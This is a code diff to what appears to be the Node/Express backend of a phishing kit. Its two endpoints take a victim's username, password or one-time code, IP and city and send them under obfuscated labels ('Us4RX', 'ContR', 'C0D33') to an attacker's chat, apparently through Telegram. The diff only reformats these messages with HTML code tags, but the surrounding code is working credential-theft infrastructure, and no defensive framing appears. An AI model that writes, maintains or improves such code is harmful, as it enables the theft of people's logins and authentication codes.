@@ -90,7 +90,7 @@ app.post('/api/sendMessage', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔴FICPY🔴\nUs4RX: ${user}\nContR: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔴FICPY🔴\nUs4RX: <code>${user}</code>\nContR: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
        const response = await axios.post(
@@ -98,6 +98,7 @@ app.post('/api/sendMessage', async (req, res) => {
   {
     chat_id: CHAT_ID,
     text: message,
+    parse_mode: 'HTML',
   },
   { httpsAgent: agent }
 );
@@ -116,7 +117,7 @@ app.post('/api/sendMessage2', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🔴FICPY🔴\nUs4RX: ${user}\nC0D33: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🔴FICPY🔴\nUs4RX: <code>${user}</code>\nC0D33: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(
@@ -124,6 +125,7 @@ app.post('/api/sendMessage2', async (req, res) => {
   {
     chat_id: CHAT_ID,
     text: message,
+    parse_mode: 'HTML',
   },
   { httpsAgent: agent }
 );
